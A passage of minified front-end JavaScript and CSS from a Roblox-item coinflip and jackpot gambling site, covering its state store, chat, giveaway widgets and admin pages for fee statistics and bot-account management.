btn.btn-gray:hover{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.btn.btn-pill{border-radius:9999px}.btn-icon{transition-property:background-color,border-color,color,fill,stroke;transition-duration:.5s}.btn-icon.btn-blue{--text-opacity:1;color:#2196f3;color:rgba(33,150,243,var(--text-opacity))}.btn-icon.btn-blue:hover{--text-opacity:1;color:#2b6cb0;color:rgba(43,108,176,var(--text-opacity))}.btn-icon.btn-red{--text-opacity:1;color:#f56565;color:rgba(245,101,101,var(--text-opacity))}.btn-icon.btn-red:hover{--text-opacity:1;color:#c53030;color:rgba(197,48,48,var(--text-opacity))}.btn-icon.btn-green{--text-opacity:1;color:#48bb78;color:rgba(72,187,120,var(--text-opacity))}.btn-icon.btn-green:hover{--text-opacity:1;color:#2f855a;color:rgba(47,133,90,var(--text-opacity))}.btn-icon.btn-gray{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.btn-icon.btn-gray:hover{--text-opacity:1;color:#2d3748;color:rgba(45,55,72,var(--text-opacity))}.btn-icon.btn-light{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.btn-icon.btn-light:hover{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.slide-fade-enter-active{transition:all .2s ease}.slide-fade-leave-active{transition:all .2s cubic-bezier(1,.5,.8,1)}.slide-fade-enter,.slide-fade-leave-to{transform:translateX(10px);opacity:0}.list-enter-active,.list-leave-active{transition:all .2s}.list-enter,.list-leave-to{opacity:0;transform:translateX(10px)}body{--bg-opacity:1;background-color:#1a1c24;background-color:rgba(26,28,36,var(--bg-opacity));--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity));overflow-y:hidden}.layout{display:block}@media (min-width:768px){.layout{display:grid;grid-template-areas:"navbar navbar" "chat main";grid-template-columns:265px 1fr;grid-template-rows:100px 1fr}}.layout .navbar{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));position:relative;grid-area:navbar}.layout .navbar .navbar__background{position:absolute;top:0;left:0;width:100%;height:100%;display:block;background-image:url(/img/pattern.png);background-repeat:repeat;opacity:.25}.layout .navbar .navbar__nav{display:grid;position:relative;grid-template-columns:265px 1fr;grid-template-rows:100px;grid-column-gap:1rem}.layout .navbar .navbar__nav .navbar__links{display:flex;align-items:center;transition:position .5s ease}@media (max-width:640px){.layout .navbar .navbar__nav .navbar__links{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));position:fixed;top:0;right:-100%;width:80%;height:calc(100vh - 100px);margin-top:100px;transition:right .5s ease;align-items:center;flex-direction:column;z-index:10}.layout .navbar .navbar__nav .navbar__links.isEnabled{right:0}}.layout .navbar .navbar__nav .navbar__link{cursor:pointer;text-transform:uppercase;margin-right:1rem;transition:color .5s ease}.layout .navbar .navbar__nav .navbar__link:not(.maximized) span{display:none}.layout .navbar .navbar__nav .navbar__link:hover{--text-opacity:1;color:#2196f3;color:rgba(33,150,243,var(--text-opacity))}@media (max-width:640px){.layout .navbar .navbar__nav .navbar__link span{display:inline!important}}@media (max-width:640px){.layout .navbar .navbar__nav{grid-template-columns:1fr}}.layout .chat{--bg-opacity:1;background-color:#1f2029;background-color:rgba(31,32,41,var(--bg-opacity));grid-area:chat;height:100vh}@media (max-width:640px){.layout .chat{position:fixed;top:0;left:-100%;width:80%;height:calc(100vh - 100px);margin-top:100px;transition:left .5s ease;z-index:10}.layout .chat.isEnabled{left:0}}.layout .main{overflow-x:hidden;overflow-y:auto;grid-area:main;max-height:calc(100vh - 200px)}@media (min-width:768px){.layout .main{max-height:calc(100vh - 100px)}}::-webkit-scrollbar{width:.25rem;border-radius:9999px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{width:.25rem;border-radius:9999px;background-color:#a0aec0}::-webkit-scrollbar-thumb:hover{background-color:#718096}.tooltip{display:block!important;z-index:10000}.tooltip .tooltip-inner{background:#000;color:#fff;border-radius:16px;padding:5px 10px 4px}.tooltip .tooltip-arrow{width:0;height:0;border-style:solid;position:absolute;margin:5px;border-color:#000;z-index:1}.tooltip[x-placement^=top]{margin-bottom:5px}.tooltip[x-placement^=top] .tooltip-arrow{border-width:5px 5px 0;border-left-color:transparent!important;border-right-color:transparent!important;border-bottom-color:transparent!important;bottom:-5px;left:calc(50% - 5px);margin-top:0;margin-bottom:0}.tooltip[x-placement^=bottom]{margin-top:5px}.tooltip[x-placement^=bottom] .tooltip-arrow{border-width:0 5px 5px;border-left-color:transparent!important;border-right-color:transparent!important;border-top-color:transparent!important;top:-5px;left:calc(50% - 5px);margin-top:0;margin-bottom:0}.tooltip[x-placement^=right]{margin-left:5px}.tooltip[x-placement^=right] .tooltip-arrow{border-width:5px 5px 5px 0;border-left-color:transparent!important;border-top-color:transparent!important;border-bottom-color:transparent!important;left:-5px;top:calc(50% - 5px);margin-left:0;margin-right:0}.tooltip[x-placement^=left]{margin-right:5px}.tooltip[x-placement^=left] .tooltip-arrow{border-width:5px 0 5px 5px;border-top-color:transparent!important;border-right-color:transparent!important;border-bottom-color:transparent!important;right:-5px;top:calc(50% - 5px);margin-left:0;margin-right:0}.tooltip.popover .popover-inner{background:#f9f9f9;color:#000;padding:24px;border-radius:5px;box-shadow:0 5px 30px rgba(0,0,0,.1)}.tooltip.popover .popover-arrow{border-color:#f9f9f9}.tooltip[aria-hidden=true]{visibility:hidden;opacity:0;transition:opacity .15s,visibility .15s}.tooltip[aria-hidden=false]{visibility:visible;opacity:1;transition:opacity .15s}', ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        r.r(e), r.d(e, "state", (function() {
            return d
        })), r.d(e, "getters", (function() {
            return f
        })), r.d(e, "mutations", (function() {
            return m
        })), r.d(e, "actions", (function() {
            return h
        }));
        r(19), r(55), r(56), r(97), r(400), r(57), r(40), r(69), r(41), r(235), r(30), r(26), r(42), r(43), r(48), r(58), r(8);
        var n = r(2),
            o = r(36);

        function c(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return l(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return l(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, c = !0,
                d = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return c = t.done, t
                },
                e: function(t) {
                    d = !0, o = t
                },
                f: function() {
                    try {
                        c || null == r.return || r.return()
                    } finally {
                        if (d) throw o
                    }
                }
            }
        }

        function l(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        var d = function() {
                return {
                    currentPage: "coinflips",
                    socket: {
                        client: null,
                        isConnected: !1,
                        reconnectError: !1
                    },
                    online: 0,
                    messages: [],
                    coinflips: [],
                    jackpot: {
                        status: "None",
                        players: []
                    },
                    giveaway: {
                        type: "None",
                        status: "None",
                        players: [],
                        userAsset: null,
                        endedAt: null,
                        winner: null
                    }
                }
            },
            f = {
                sortedCoinflips: function(t) {
                    return Object(o.a)(t.coinflips).sort((function(a, b) {
                        return b.totalValue - a.totalValue
                    }))
                },
                totalCoinflipsValue: function(t) {
                    return t.coinflips.reduce((function(t, e) {
                        return t + e.totalValue
                    }), 0)
                },
                totalCoinflipsRAP: function(t) {
                    return t.coinflips.reduce((function(t, e) {
                        return t + e.totalRAP
                    }), 0)
                },
                sortedJackpotPlayers: function(t) {
                    return Object(o.a)(t.jackpot.players).sort((function(a, b) {
                        return b.betValue - a.betValue
                    }))
                },
                totalJackpotValueFromPlayers: function(t) {
                    return t.jackpot.players.reduce((function(t, e) {
                        return t + e.betValue
                    }), 0)
                }
            },
            m = {
                SOCKET_ONOPEN: function(t, e) {
                    var r = e.currentTarget;
                    t.socket.client = r, t.socket.isConnected = !0, console.log("Socket connected")
                },
                SOCKET_ONCLOSE: function(t) {
                    t.socket.isConnected = !1, console.log("Socket disconnected")
                },
                SOCKET_ONMESSAGE: function(t, e) {
                    console.log("Uncaught message received:", e)
                },
                SOCKET_RECONNECT: function(t, e) {},
                SOCKET_RECONNECT_ERROR: function(t) {
                    t.socket.reconnectError = !0
                },
                SET_CURRENT_PAGE: function(t, e) {
                    t.currentPage = e
                },
                SET_ONLINE: function(t, e) {
                    t.online = e
                },
                SET_MESSAGES: function(t, e) {
                    t.messages = e
                },
                ADD_MESSAGE: function(t, e) {
                    t.messages.length > 50 && t.messages.shift(), t.messages.push(e)
                },
                SET_COINFLIPS: function(t, e) {
                    t.coinflips = e
                },
                ADD_COINFLIP: function(t, e) {
                    t.coinflips.push(e)
                },
                REMOVE_COINFLIP: function(t, e) {
                    var r = t.coinflips.findIndex((function(t) {
                        return t._id == e
                    }));
                    r > -1 && t.coinflips.splice(r, 1)
                },
                ADD_COINFLIP_PLAYER: function(t, e) {
                    var r, n = e.coinflipId,
                        c = e.player,
                        l = t.coinflips.find((function(t) {
                            return t._id == n
                        }));
                    l && (l.challenger = c, (r = l.userAssets).push.apply(r, Object(o.a)(c.userAssets)), l.totalValue += c.betValue, l.totalRAP += c.betRAP, l.status = "Processing")
                },
                SET_COINFLIP_TIME_LEFT: function(t, e) {
                    var r = e.coinflipId,
                        n = e.timeLeft,
                        o = t.coinflips.find((function(t) {
                            return t._id == r
                        }));
                    o && (o.timeLeft = n)
                },
                SET_COINFLIP_WINNER: function(t, e) {
                    var r = e.coinflipId,
                        n = e.secret,
                        o = e.float,
                        c = e.winningPlayer,
                        l = e.winningOption,
                        d = t.coinflips.find((function(t) {
                            return t._id == r
                        }));
                    d && (d.cryptoData.secret = n, d.cryptoData.float = o, d.winningPlayer = c, d.winningOption = l, d.winner = d[c], d.timeLeft = null, d.isActive = !1, d.endedAt = Date.now(), d.status = "Completed")
                },
                SET_JACKPOT: function(t, e) {
                    t.jackpot = e
                },
                SET_JACKPOT_STATUS: function(t, e) {
                    t.jackpot.status = e
                },
                SET_JACKPOT_ACTIVATED: function(t, e) {
                    var r = e._id;
                    t.jackpot._id = r, t.jackpot.status = "Pending"
                },
                SET_JACKPOT_PLAYERS: function(t, e) {
                    t.jackpot.players = e;
                    var r, n = [],
                        l = 0,
                        d = c(e);
                    try {
                        for (d.s(); !(r = d.n()).done;) {
                            var f = r.value;
                            n.push.apply(n, Object(o.a)(f.userAssets)), l += f.betValue
                        }
                    } catch (t) {
                        d.e(t)
                    } finally {
                        d.f()
                    }
                    t.jackpot.userAssets = n, t.jackpot.totalValue = l
                },
                SET_JACKPOT_START_AND_END: function(t, e) {
                    var r = e.startedAt,
                        n = e.endedAt;
                    t.jackpot.startedAt = r, t.jackpot.endedAt = n
                },
                SET_JACKPOT_WINNER: function(t, e) {
                    var r = e.secret,
                        n = e.float,
                        o = e.winner;
                    t.jackpot.cryptoData.secret = r, t.jackpot.cryptoData.float = n, t.jackpot.winner = o, t.jackpot.isActive = !1, t.jackpot.status = "Completed"
                },
                SET_GIVEAWAY: function(t, e) {
                    t.giveaway = e
                },
                RESET_GIVEAWAY: function(t) {
                    t.giveaway = {
                        type: "None",
                        status: "None",
                        players: [],
                        userAsset: null,
                        endedAt: null,
                        winner: null
                    }
                },
                ADD_GIVEAWAY_PLAYER: function(t, e) {
                    t.giveaway.players.push(e)
                },
                SET_GIVEAWAY_WINNER: function(t, e) {
                    t.giveaway.winner = e
                }
            },
            h = {
                nuxtClientInit: function(t) {
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    r = t.dispatch, n = localStorage.getItem("currentPage"), r("setCurrentPage", n);
                                case 3:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                setCurrentPage: function(t, e) {
                    var r = t.commit;
                    e && (r("SET_CURRENT_PAGE", e), localStorage.setItem("currentPage", e))
                },
                addNotification: function(t, e) {
                    var r = t.state;
                    t.commit;
                    if (e.scope) {
                        if (!this.$auth.loggedIn) return;
                        var n = this.$auth.user._id;
                        if ("Coinflip" == e.scope) {
                            var o = r.coinflips.find((function(t) {
                                return t._id == e.key
                            }));
                            if (!o) return;
                            if (!o.creator.userId != n) return;
                            if (o.challenger && o.challenger.userId != n) return
                        } else if ("Jackpot" == e.scope) {
                            if (!r.jackpot.players.find((function(t) {
                                    return t.userId == n
                                }))) return
                        } else if ("Giveaway" == e.scope && !r.giveaway.players.includes(n)) return
                    }
                    var c = {
                        position: e.position || "top",
                        duration: 1e3 * (e.duration || 10)
                    };
                    this._vm.$toast[e.type.toLowerCase()](e.message, c)
                },
                clientLoaded: function(t, e) {
                    var r = t.commit,
                        n = e.data,
                        o = n.online,
                        c = n.messages,
                        l = n.coinflips,
                        d = n.jackpot,
                        f = n.giveaway;
                    r("SET_ONLINE", o), r("SET_MESSAGES", c), r("SET_JACKPOT", d), r("SET_GIVEAWAY", f), r("SET_COINFLIPS", l), console.log("Client loaded")
                },
                onlineUsersUpdated: function(t, e) {
                    (0, t.commit)("SET_ONLINE", e.data)
                },
                messageReceived: function(t, e) {
                    (0, t.commit)("ADD_MESSAGE", e.data)
                },
                notificationReceived: function(t, e) {
                    (0, t.dispatch)("addNotification", e.data)
                },
                coinflipCreated: function(t, e) {
                    (0, t.commit)("ADD_COINFLIP", e.data)
                },
                coinflipPlayerJoined: function(t, e) {
                    (0, t.commit)("ADD_COINFLIP_PLAYER", e.data)
                },
                coinflipTimerUpdated: function(t, e) {
                    (0, t.commit)("SET_COINFLIP_TIME_LEFT", e.data)
                },
                coinflipWinnerDecided: function(t, e) {
                    (0, t.commit)("SET_COINFLIP_WINNER", e.data)
                },
                coinflipRemoved: function(t, e) {
                    (0, t.commit)("REMOVE_COINFLIP", e.data)
                },
                jackpotCreated: function(t, e) {
                    (0, t.commit)("SET_JACKPOT", e.data)
                },
                jackpotActivated: function(t, e) {
                    (0, t.commit)("SET_JACKPOT_ACTIVATED", e.data)
                },
                jackpotPlayerJoined: function(t, e) {
                    (0, t.commit)("SET_JACKPOT_PLAYERS", e.data)
                },
                jackpotTimerStarted: function(t, e) {
                    (0, t.commit)("SET_JACKPOT_START_AND_END", e.data)
                },
                jackpotWinnerDecided: function(t, e) {
                    (0, t.commit)("SET_JACKPOT_WINNER", e.data)
                },
                jackpotCooldownStarted: function(t, e) {
                    var r = t.commit;
                    r("SET_JACKPOT_START_AND_END", e.data), r("SET_JACKPOT_STATUS", "Cooldown")
                },
                giveawayCreated: function(t, e) {
                    (0, t.commit)("SET_GIVEAWAY", e.data)
                },
                giveawayReset: function(t) {
                    (0, t.commit)("RESET_GIVEAWAY")
                },
                giveawayPlayerJoined: function(t, e) {
                    (0, t.commit)("ADD_GIVEAWAY_PLAYER", e.data)
                },
                giveawayWinnerDecided: function(t, e) {
                    (0, t.commit)("SET_GIVEAWAY_WINNER", e.data)
                }
            }
    }, , , , , , , , , , , , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                data: function() {
                    return {
                        links: [{
                            url: "/coinflips",
                            label: "Coinflip",
                            icon: ["fas", "coins"],
                            maximized: !0
                        }, {
                            url: "/jackpot",
                            label: "Jackpot",
                            icon: ["fas", "bomb"],
                            maximized: !0
                        }, {
                            url: "/claims",
                            label: "claims",
                            icon: ["fas", "receipt"],
                            maximized: !0
                        }, {
                            url: "/stats",
                            label: "Statistics",
                            icon: ["fas", "chart-area"]
                        }, {
                            url: "/topten",
                            label: "Leaderboard",
                            icon: ["fas", "list-ol"]
                        }, {
                            url: "/faq",
                            label: "FAQ",
                            icon: ["fas", "question"]
                        }, {
                            url: "/tos",
                            label: "Terms Of Service",
                            icon: ["fas", "gavel"]
                        }],
                        hrefs: [{
                            url: "https://twitter.com/rbxflip",
                            label: "Twitter",
                            icon: ["fab", "twitter"],
                            id: "twitter"
                        }]
                    }
                }
            },
            o = r(0),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("nav", {
                    staticClass: "navbar"
                }, [e("div", {
                    staticClass: "navbar__background"
                }), this._v(" "), e("div", {
                    staticClass: "navbar__nav"
                }, [e("Brand", {
                    attrs: {
                        "logo-width": "175px"
                    }
                }), this._v(" "), e("NavLinks", {
                    attrs: {
                        links: this.links,
                        hrefs: this.hrefs
                    }
                })], 1)])
            }), [], !1, null, null, null);
        e.default = component.exports;
        installComponents(component, {
            Brand: r(98).default,
            NavLinks: r(432).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(19), r(17), r(29), r(40), r(49), r(50), r(34), r(43), r(31), r(8);
        var n = r(2),
            o = r(13),
            c = r(18);

        function l(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function d(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? l(Object(source), !0).forEach((function(e) {
                    Object(o.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : l(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        var f = {
                data: function() {
                    return {
                        disabled: !1,
                        form: {
                            content: ""
                        }
                    }
                },
                watch: {
                    "giveaway.type": function(t) {
                        null != t && this.canJoinGiveaway && (this.disabled = !1)
                    }
                },
                computed: d(d({}, Object(c.d)(["socket", "online", "messages", "giveaway"])), {}, {
                    canJoinGiveaway: function() {
                        return this.$auth.loggedIn && this.giveaway.isActive && null == this.giveaway.winner && !this.giveaway.players.includes(this.$auth.user._id)
                    }
                }),
                methods: {
                    sendMessage: function() {
                        console.log("Sending message ...", this.form), this.socket.client.sendObj({
                            action: "sendMessage",
                            data: this.form
                        }), console.log("Sent message"), this.form.content = ""
                    },
                    joinGiveaway: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, t.disabled = !0, e.next = 4, t.$axios.put("giveaway");
                                    case 4:
                                        t.$toast.success("Success!"), e.next = 12;
                                        break;
                                    case 7:
                                        e.prev = 7, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message), t.disabled = !1;
                                    case 12:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 7]
                            ])
                        })))()
                    }
                }
            },
            m = (r(315), r(0)),
            component = Object(m.a)(f, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "chat"
                }, [t.socket.isConnected ? r("div", {
                    staticClass: "chat__wrapper"
                }, ["None" != t.giveaway.status ? r("div", {
                    attrs: {
                        id: "giveaway"
                    }
                }, [t._m(0), t._v(" "), r("ChatGiveaway", {
                    attrs: {
                        type: t.giveaway.type,
                        players: t.giveaway.players.length,
                        winner: t.giveaway.winner,
                        "user-asset": t.giveaway.userAsset,
                        "ended-at": t.giveaway.endedAt
                    }
                }), t._v(" "), t.canJoinGiveaway ? r("div", {
                    staticClass: "giveaway-submit"
                }, [r("button", {
                    staticClass: "btn btn-green btn-full",
                    attrs: {
                        disabled: t.disabled
                    },
                    on: {
                        click: t.joinGiveaway
                    }
                }, [t._v("Join")])]) : t._e()], 1) : t._e(), t._v(" "), r("div", {
                    attrs: {
                        id: "messages"
                    }
                }, [r("div", {
                    staticClass: "chat__channel"
                }, [r("span", {
                    staticClass: "channel__label"
                }, [t._v("Messages")]), t._v(" "), r("label", {
                    staticClass: "online"
                }, [r("span", {
                    staticClass: "online__count"
                }, [t._v(t._s(t.online))]), t._v(" "), r("span", {
                    staticClass: "online__dot"
                })])]), t._v(" "), r("transition-group", {
                    directives: [{
                        name: "chat-scroll",
                        rawName: "v-chat-scroll",
                        value: {
                            always: !1,
                            smooth: !0,
                            scrollonremoved: !0
                        },
                        expression: "{always: false, smooth: true, scrollonremoved:true}"
                    }],
                    staticClass: "chat__messages",
                    style: "max-height: " + (t.giveaway.isActive ? "300px" : "calc(100vh - 300px)"),
                    attrs: {
                        name: "list",
                        tag: "ul"
                    }
                }, t._l(t.messages, (function(t, i) {
                    return r("ChatMessage", {
                        key: "MSG-" + i,
                        attrs: {
                            "user-id": t.userId,
                            username: t.username,
                            content: t.content,
                            "is-vip": t.isVIP,
                            "is-admin": t.isAdmin
                        }
                    })
                })), 1), t._v(" "), t.$auth.loggedIn ? r("form", {
                    staticClass: "chat__form",
                    attrs: {
                        form: ""
                    },
                    on: {
                        submit: function(e) {
                            return e.preventDefault(), t.sendMessage(e)
                        }
                    }
                }, [r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.form.content,
                        expression: "form.content"
                    }],
                    staticClass: "p-0 h-8 form-input form-input-dark",
                    staticStyle: {
                        "text-indent": "8px"
                    },
                    attrs: {
                        type: "text",
                        placeholder: "Say something!"
                    },
                    domProps: {
                        value: t.form.content
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.form, "content", e.target.value)
                        }
                    }
                }), t._v(" "), r("input", {
                    staticClass: "btn btn-gray",
                    attrs: {
                        type: "submit",
                        value: "Send"
                    }
                })]) : t._e()], 1)]) : r("div", {
                    staticClass: "spinner__wrapper"
                }, [r("Spinner")], 1)])
            }), [function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "chat__channel"
                }, [e("span", {
                    staticClass: "channel__label"
                }, [this._v("Giveaway")])])
            }], !1, null, "c9687c5a", null);
        e.default = component.exports;
        installComponents(component, {
            ChatGiveaway: r(433).default,
            ChatMessage: r(434).default,
            Spinner: r(51).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                methods: {
                    toggleNav: function() {
                        document.querySelector(".navbar__links").classList.toggle("isEnabled"), document.querySelector(".chat").classList.toggle("isEnabled", !1)
                    },
                    toggleChat: function() {
                        document.querySelector(".chat").classList.toggle("isEnabled"), document.querySelector(".navbar__links").classList.toggle("isEnabled", !1)
                    }
                }
            },
            o = (r(321), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "toggle"
                }, [e("div", {
                    staticClass: "toggle__control",
                    on: {
                        click: this.toggleChat
                    }
                }, [e("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "comments"]
                    }
                })], 1), this._v(" "), e("div", {
                    staticClass: "toggle__control",
                    on: {
                        click: this.toggleNav
                    }
                }, [e("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "bars"]
                    }
                })], 1)])
            }), [], !1, null, "4a3d196d", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(8);
        var n = r(2),
            o = {
                middleware: "auth",
                data: function() {
                    return {
                        details: {},
                        lifetimeMap: [{
                            key: "totalFeesValue",
                            label: "Lifetime Fees",
                            prefix: "R$"
                        }, {
                            key: "totalCoinflipFeesValue",
                            label: "Lifetime Coinflip Fees",
                            prefix: "R$"
                        }, {
                            key: "totalJackpotFeesValue",
                            label: "Lifetime Jackpot Fees",
                            prefix: "R$"
                        }],
                        past24hrMap: [{
                            key: "totalFeesValue",
                            label: "Past 24hr Fees",
                            prefix: "R$"
                        }, {
                            key: "gamesCompleted",
                            label: "Past 24hr Games"
                        }, {
                            key: "coinflipFeesValue",
                            label: "Past 24hr Coinflip Fees",
                            prefix: "R$"
                        }, {
                            key: "coinflipsCompleted",
                            label: "Past 24hr Coinflips"
                        }, {
                            key: "jackpotFeesValue",
                            label: "Past 24hr Jackpot Fees",
                            prefix: "R$"
                        }, {
                            key: "jackpotsCompleted",
                            label: "Past 24hr Jackpots"
                        }]
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, details;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    return e.next = 2, t.$axios.$get("admin");
                                case 2:
                                    r = e.sent, details = r.data.details, t.details = details;
                                case 5:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                }
            },
            c = r(0),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "admin__overview widget"
                }, [r("h1", {
                    staticClass: "widget__title"
                }, [t._v("Overview")]), t._v(" "), t.$fetchState.pending ? r("div", [r("Spinner")], 1) : r("div", [r("StatList", {
                    attrs: {
                        map: t.lifetimeMap,
                        data: t.details
                    }
                }), t._v(" "), r("StatList", {
                    attrs: {
                        map: t.past24hrMap,
                        data: t.details.past24hr
                    }
                })], 1)])
            }), [], !1, null, null, null);
        e.default = component.exports;
        installComponents(component, {
            Spinner: r(51).default,
            StatList: r(183).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(21), r(40), r(43), r(8);
        var n = r(2),
            o = {
                data: function() {
                    return {
                        bot: {
                            credentials: ""
                        },
                        botType: 0,
                        storageAccounts: [],
                        feeAccounts: []
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n, o, c;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    return e.next = 2, t.$axios.$get("/admin/bots");
                                case 2:
                                    r = e.sent, n = r.data, o = n.feeAccounts, c = n.storageAccounts, t.storageAccounts = c, t.feeAccounts = o;
                                case 8:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                methods: {
                    copyCookie: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, r.next = 3, navigator.clipboard.writeText(t);
                                    case 3:
                                        e.$toast.success("Copied!"), r.next = 10;
                                        break;
                                    case 6:
                                        r.prev = 6, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error("Could not copy to clipboard");
                                    case 10:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 6]
                            ])
                        })))()
                    },
                    createBot: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            var r;
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, r = 0 == t.botType ? "StorageAccount" : "FeeAccount", e.next = 4, t.$axios.$post("admin/bots/".concat(r), t.bot);
                                    case 4:
                                        t.$toast.success("Success!"), t.bot.credentials = "", t.$fetch(), e.next = 13;
                                        break;
                                    case 9:
                                        e.prev = 9, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message);
                                    case 13:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 9]
                            ])
                        })))()
                    },
                    updateBot: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            var n;
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, n = e.storageAccounts.includes(t) ? "StorageAccount" : "FeeAccount", r.next = 4, e.$axios.$put("admin/bots/".concat(n, "/").concat(t._id), t);
                                    case 4:
                                        e.$toast.success("Success!"), e.$fetch(), r.next = 12;
                                        break;
                                    case 8:
                                        r.prev = 8, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error(r.t0.response ? r.t0.response.data.error : r.t0.message);
                                    case 12:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 8]
                            ])
                        })))()
                    },
                    deleteBot: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            var n;
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, n = e.storageAccounts.includes(t) ? "StorageAccount" : "FeeAccount", r.next = 4, e.$axios.$delete("admin/bots/".concat(n, "/").concat(t._id));
                                    case 4:
                                        e.$toast.success("Success!"), e.$fetch(), r.next = 12;
                                        break;
                                    case 8:
                                        r.prev = 8, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error(r.t0.response ? r.t0.response.data.error : r.t0.message);
                                    case 12:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 8]
                            ])
                        })))()
                    }
                }
            },
            c = (r(329), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "admin__bots widget"
                }, [r("h1", {
                    staticClass: "widget__title"
